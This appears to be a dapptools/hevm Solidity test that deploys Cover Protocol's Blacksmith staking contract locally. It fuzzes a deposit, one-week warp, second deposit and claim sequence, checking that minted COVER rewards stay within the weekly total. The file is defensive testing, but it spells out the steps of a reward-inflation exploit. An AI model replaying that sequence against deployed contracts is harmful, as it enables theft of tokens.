// SPDX-License-Identifier: None
pragma solidity ^0.7.4;

import "ds-test/test.sol";
import "ds-token/token.sol";

import "./Blacksmith.sol";
import "./IBlacksmith.sol";
import "./COVER.sol";

interface Hevm {
    function warp(uint256) external;
}

contract Guy {
    function approve(DSToken token, address addr) external {
        token.approve(addr);
    }
    function deposit(IBlacksmith bs, address lpToken, uint256 amount) external {
        bs.deposit(lpToken, amount);
    }
    function withdraw(IBlacksmith bs, address lpToken, uint256 amount) external {
        bs.withdraw(lpToken, amount);
    }
    function claimRewards(IBlacksmith bs, address lpToken) external {
        bs.claimRewards(lpToken);
    }
}

contract DhCover20201228Test is DSTest {

    // CHEAT_CODE = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D
    bytes20 constant CHEAT_CODE =
        bytes20(uint160(uint256(keccak256('hevm cheat code'))));

    Hevm hevm;

    COVER coverToken;
    IBlacksmith blacksmith;
    DSToken lpToken;
    address governance;
    address treasury;
    Guy bob;

    function setUp() public {
        hevm = Hevm(address(CHEAT_CODE));
        hevm.warp(1605830400);  // 11/20/2020 12am UTC
        lpToken = new DSToken("LPTOKEN");
        coverToken = new COVER();
        governance = address(this);
        treasury = address(0x1);
        blacksmith = new Blacksmith(address(coverToken), governance, treasury);
        coverToken.release(treasury, address(0x2), address(blacksmith), address(0x3));
        blacksmith.addPool(address(lpToken), 100);
        blacksmith.updateWeeklyTotal(100 * 10**18);
        bob = new Guy();
        bob.approve(lpToken, address(blacksmith));
    }

    function test_fuzz_exploit(uint amt1, uint amt2) public {
        if (amt1 > 100_000_000 ether || amt1 == 0) return;
        if (amt2 > 100_000_000 ether || amt2 == 0) return;
        if (amt1 + amt2 < amt1) return;

        lpToken.mint(address(bob), amt1 + amt2);
        bob.deposit(blacksmith, address(lpToken), amt1);
        hevm.warp(block.timestamp + 1 weeks);
        bob.deposit(blacksmith, address(lpToken), amt2);
        bob.claimRewards(blacksmith, address(lpToken));
        assertLe(coverToken.balanceOf(address(bob)), Blacksmith(address(blacksmith)).weeklyTotal());
    }

    function prove_exploit(uint amt1, uint amt2) public {
        if (amt1 > 100_000_000 ether || amt1 == 0) return;
        if (amt2 > 100_000_000 ether || amt2 == 0) return;
        if (amt1 + amt2 < amt1) return;

        lpToken.mint(address(bob), amt1 + amt2);
        bob.deposit(blacksmith, address(lpToken), amt1);
        hevm.warp(block.timestamp + 1 weeks);
        bob.deposit(blacksmith, address(lpToken), amt2);
        bob.claimRewards(blacksmith, address(lpToken));
        assertLe(coverToken.balanceOf(address(bob)), Blacksmith(address(blacksmith)).weeklyTotal());
    }
}
